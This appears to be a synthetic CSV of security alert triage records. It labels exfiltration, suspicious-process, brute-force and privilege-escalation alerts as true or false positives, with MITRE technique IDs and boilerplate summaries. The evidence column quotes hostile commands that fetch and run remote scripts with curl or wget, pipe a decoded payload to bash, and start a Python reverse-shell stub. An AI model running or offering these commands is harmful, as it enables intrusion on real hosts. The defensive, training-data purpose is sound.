rule,technique,severity,entity,detail,outcome,priority,summary
Data exfiltration,T1041,critical,host42,183 MB to 52.111.190.65,false_positive,6,Data exfiltration on host42 (T1041). Evidence: 183 MB to 52.111.190.65. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host13,378 MB to 52.86.174.20,false_positive,6,Data exfiltration on host13 (T1041). Evidence: 378 MB to 52.86.174.20. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host10,232 MB to 52.35.253.133,false_positive,6,Data exfiltration on host10 (T1041). Evidence: 232 MB to 52.35.253.133. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host45,312 MB to 52.150.198.158,false_positive,6,Data exfiltration on host45 (T1041). Evidence: 312 MB to 52.150.198.158. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host17,414 MB to 52.226.231.2,false_positive,6,Data exfiltration on host17 (T1041). Evidence: 414 MB to 52.226.231.2. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host12,bash -c 'curl http://185.34.2.9/x.sh | bash',true_positive,6,Suspicious process on host12 (T1059). Evidence: bash -c 'curl http://185.34.2.9/x.sh | bash'. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host46,chmod +x /tmp/.k && /tmp/.k,true_positive,6,Suspicious process on host46 (T1059). Evidence: chmod +x /tmp/.k && /tmp/.k. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host30,chmod +x /tmp/.k && /tmp/.k,true_positive,6,Suspicious process on host30 (T1059). Evidence: chmod +x /tmp/.k && /tmp/.k. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host21,base64 -d payload.b64 | bash,true_positive,6,Suspicious process on host21 (T1059). Evidence: base64 -d payload.b64 | bash. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host02,bash -c 'curl http://185.34.2.9/x.sh | bash',true_positive,6,Suspicious process on host02 (T1059). Evidence: bash -c 'curl http://185.34.2.9/x.sh | bash'. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host29,bash -c 'curl http://185.34.2.9/x.sh | bash',true_positive,6,Suspicious process on host29 (T1059). Evidence: bash -c 'curl http://185.34.2.9/x.sh | bash'. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host11,chmod +x /tmp/.k && /tmp/.k,true_positive,6,Suspicious process on host11 (T1059). Evidence: chmod +x /tmp/.k && /tmp/.k. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host29,base64 -d payload.b64 | bash,true_positive,6,Suspicious process on host29 (T1059). Evidence: base64 -d payload.b64 | bash. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host31,bash -c 'curl http://185.34.2.9/x.sh | bash',true_positive,6,Suspicious process on host31 (T1059). Evidence: bash -c 'curl http://185.34.2.9/x.sh | bash'. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host15,"python3 -c 'import socket,os,pty;...'",true_positive,6,"Suspicious process on host15 (T1059). Evidence: python3 -c 'import socket,os,pty;...'. Next step: confirm the source is expected for this entity and check for related activity."
Suspicious process,T1059,critical,host15,wget http://45.9.1.7/m -O /tmp/m && /tmp/m,true_positive,6,Suspicious process on host15 (T1059). Evidence: wget http://45.9.1.7/m -O /tmp/m && /tmp/m. Next step: confirm the source is expected for this entity and check for related activity.
Suspicious process,T1059,critical,host34,wget http://45.9.1.7/m -O /tmp/m && /tmp/m,true_positive,6,Suspicious process on host34 (T1059). Evidence: wget http://45.9.1.7/m -O /tmp/m && /tmp/m. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host45,619 MB to 95.208.62.21,true_positive,6,Data exfiltration on host45 (T1041). Evidence: 619 MB to 95.208.62.21. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host36,2485 MB to 95.195.238.150,true_positive,6,Data exfiltration on host36 (T1041). Evidence: 2485 MB to 95.195.238.150. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host21,1477 MB to 95.252.147.253,true_positive,6,Data exfiltration on host21 (T1041). Evidence: 1477 MB to 95.252.147.253. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host24,1182 MB to 95.56.128.247,true_positive,6,Data exfiltration on host24 (T1041). Evidence: 1182 MB to 95.56.128.247. Next step: confirm the source is expected for this entity and check for related activity.
Data exfiltration,T1041,critical,host34,1047 MB to 95.125.231.206,true_positive,6,Data exfiltration on host34 (T1041). Evidence: 1047 MB to 95.125.231.206. Next step: confirm the source is expected for this entity and check for related activity.
Brute force,T1110,high,user018@103.70.153.197,19 failed logins in <2h,false_positive,4,Brute force on user018@103.70.153.197 (T1110). Evidence: 19 failed logins in <2h. Next step: confirm the source is expected for this entity and check for related activity.
Brute force,T1110,high,user193@52.191.189.134,19 failed logins in <2h,false_positive,4,Brute force on user193@52.191.189.134 (T1110). Evidence: 19 failed logins in <2h. Next step: confirm the source is expected for this entity and check for related activity.
Privilege escalation,T1548,high,host40,sudo su -,false_positive,4,Privilege escalation on host40 (T1548). Evidence: sudo su -. Next step: confirm the source is expected for this entity and check for related activity.
Privilege escalation,T1548,high,host04,sudo su -,false_positive,4,Privilege escalation on host04 (T1548). Evidence: sudo su -. Next step: confirm the source is expected for this entity and check for related activity.
Privilege escalation,T1548,high,host47,sudo su -,false_positive,4,Privilege escalation on host47 (T1548). Evidence: sudo su -. Next step: confirm the source is expected for this entity and check for related activity.
Privilege escalation,T1548,high,host21,sudo su -,false_positive,4,Privilege escalation on host21 (T1548). Evidence: sudo su -. Next step: confirm the source is expected for this entity and check for related activity.
Privilege escalation,T1548,high,host43,sudo su -,false_positive,4,Privilege escalation on host43 (T1548). Evidence: sudo su -. Next step: confirm the source is expected for this entity and check for related activity.
Privilege escalation,T1548,high,host11,sudo su -,false_positive,4,Privilege escalation on host11 (T1548). Evidence: sudo su -. Next step: confirm the source is expected for this entity and check for related activity.
Brute force,T1110,high,user043@177.188.232.16,45 failed logins in <2h,true_positive,4,Brute force on user043@177.188.232.16 (T1110). Evidence: 45 failed logins in <2h. Next step: confirm the source is expected for this entity and check for related activity.
Brute force,T1110,high,user043@95.103.180.18,59 failed logins in <2h,true_positive,4,Brute force on user043@95.103.180.18 (T1110). Evidence: 59 failed logins in <2h. Next step: confirm the source is expected for this entity and check for related activity.
Brute force,T1110,high,user051@95.35.254.23,32 failed logins in <2h,true_positive,4,Brute force on user051@95.35.254.23 (T1110). Evidence: 32 failed logins in <2h. Next step: confirm the source is expected for this entity and check for related activity.
Brute force,T1110,high,user057@177.228.129.220,53 failed logins in <2h,true_positive,4,Brute force on user057@177.228.129.220 (T1110). Evidence: 53 failed logins in <2h. Next step: confirm the source is expected for this entity and check for related activity.
Brute force,T1110,high,user082@95.99.214.69,67 failed logins in <2h,true_positive,4,Brute force on user082@95.99.214.69 (T1110). Evidence: 67 failed logins in <2h. Next step: confirm the source is expected for this entity and check for related activity.
